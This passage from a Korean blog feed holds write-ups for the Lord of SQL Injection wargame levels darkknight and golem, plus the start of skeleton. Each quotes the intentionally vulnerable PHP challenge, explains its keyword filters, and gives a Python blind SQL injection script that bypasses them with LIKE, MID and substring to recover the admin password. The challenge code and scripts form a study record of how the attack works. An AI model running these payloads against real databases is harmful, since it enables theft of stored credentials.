    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.11 Golem</title>
    <link href="https://www.jslee.me/2019/08/22/los-write-up-11-golem/"/>
    <id>https://www.jslee.me/2019/08/22/los-write-up-11-golem/</id>
    <published>2019-08-22T12:16:21.000Z</published>
    <updated>2019-08-23T01:33:54.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 11번 golem 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>and</code>, <code>or</code>, <code>substr(</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string addslashes ( string $str )</span><br></pre></td></tr></table></figure><ul><li><code>addslashes</code> 함수는 데이터베이스 질의 등에서 처리할 필요가 있는 문자(홑따옴표(‘), 겹따옴표(“), 백슬래시(\), NUL(NULL 바이트)) 앞에 백슬래시를 붙인 문자열을 반환한다.</li><li>php의 <code>addslashes</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.addslashes.php" target="_blank" rel="noopener">PHP: addslashes - Manual</a></li></ul><h4 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL Injection</h4><p>4번 orc 문제같은 경우 실제 <code>pw</code>값을 알아내야 한다. 이때 화면에 <code>Hello admin</code>이라는 문자열이 출력되었는지 안 되었는지 여부에 따라 조작한 SQL문의 조건절이 참인지 거짓인지 알아낼 수 있다.</p><p>이처럼 SQL Injection이 가능하고 조작한 SQL문의 조건절이 참인지 거짓인지를 구분할 수 있는 경우 원하는 데이터를 하나씩 알아낼 수 있는데, 이를 Blind SQL Injection 이라고 한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>golem 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/or|and|substr\(|=/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_golem where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_golem where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"golem"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/or|and|substr\(|=/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>or</code>, <code>and</code>, <code>substr(</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_golem where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_golem where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"golem"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET 방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>SUBSTRING</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw="</span></span><br><span class="line">    data = <span class="string">"' || id LIKE 'admin' &amp;&amp; length(pw) LIKE '&#123;&#125;'#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw="</span></span><br><span class="line">        data = <span class="string">"' || id LIKE 'admin' &amp;&amp; substring(pw, 1, &#123;&#125;) LIKE '&#123;&#125;'#"</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, substr( 을 substring(, = 을 LIKE 로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>88e3137f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=88e3137f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 11번 golem 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.10 Skeleton</title>
    <link href="https://www.jslee.me/2019/08/21/los-write-up-10-skeleton/"/>
    <id>https://www.jslee.me/2019/08/21/los-write-up-10-skeleton/</id>
    <published>2019-08-21T14:35:49.000Z</published>
    <updated>2019-08-21T14:53:12.356Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 10번 skeleton 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>SQL Injection을 통해 필요하지 않은 조건절을 무력화시킬 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>skeleton 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_skeleton where id='guest' 